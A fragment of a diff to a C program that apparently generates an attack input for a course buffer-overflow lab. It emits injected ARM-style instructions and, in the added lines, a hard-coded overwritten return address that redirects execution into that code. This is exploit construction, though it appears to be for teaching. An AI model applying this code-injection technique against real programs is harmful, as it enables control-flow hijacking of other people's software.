@@ -7,6 +7,8 @@ int main(void)
 {
     int i;
     const char* name = "Tansha Vugarwal";
+    unsigned long ulReturnAddress = 0x420078;
+
     unsigned int uiMovInstr = MiniAssembler_mov(0, 65);
     unsigned int uiAdrInstr = MiniAssembler_adr(1, 0x420044, 0xffffbe791624);
     unsigned int uiStrbInstr = MiniAssembler_strb(0, 1);
@@ -27,7 +29,8 @@ int main(void)
     fprintf(psFile, "%i", uiMovInstr);
     fprintf(psFile, "%i", uiAdrInstr);
     fprintf(psFile, "%i", uiStrbInstr);
-    fprintf(psFile, "%i", uiBInstr);
+    fprintf(psFile, "%i", uiBInstr);    
+    fwrite(&ulReturnAddress, sizeof(unsigned long), 1, psFile);
 
     fclose(psFile);
 
